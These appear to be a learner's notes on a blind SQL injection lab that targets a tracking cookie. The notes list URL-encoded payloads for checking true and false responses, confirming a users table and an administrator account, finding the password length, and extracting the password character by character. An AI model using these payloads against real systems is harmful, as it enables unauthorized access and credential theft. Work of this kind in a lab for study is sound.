# Lab: Blind SQL injection with conditional responses

vulnerable parameter - tracking cookie

End Goals :
1- Enmerate admin password
2- login as admin

Analysis:
1- confirm that the parameter is vulnerable to blind SQLI

the backend query might be something like this
SELECT stuff FROM some_table  WHERE tracking_id = 'usZTWfOGRaEcb9dx'

-> if this tracking id exists -> query returns value -> welcome back message
-> if this tracking id doesn't exists -> query returns nothiing -> no welcome back message

usZTWfOGRaEcb9dx'+and+1=1+--
-> welcome back message
usZTWfOGRaEcb9dx'+and+1=0+--
-> no welcome back message

2- confirm that we have a users table

'+and++(select+'x'+from+users+limit+1)+=+'x'+--
-> users table exists in the daatabase

3- Confirm that username administrator exists in users table

'+and++(select+'x'+from+users+where+username+='administrator')+=+'x'+--
-> administrator user exists in the database

4- Enumerate the password of the administrator user
    4.1 Enumerate the length of the password

'+and++(select+'x'+from+users+where+username+='administrator'+andlength(password)=20)+=+'x'+--
->
the length of the password is = 20 char

    4.2 Enumerate the password
    '+and+(select+substring(password,1,1)+from+users+where+username+=+'administrator'+)+=+'a'+--
    using burb intruder the first char is '6'
    
    i will script it in python

python script.py "url"
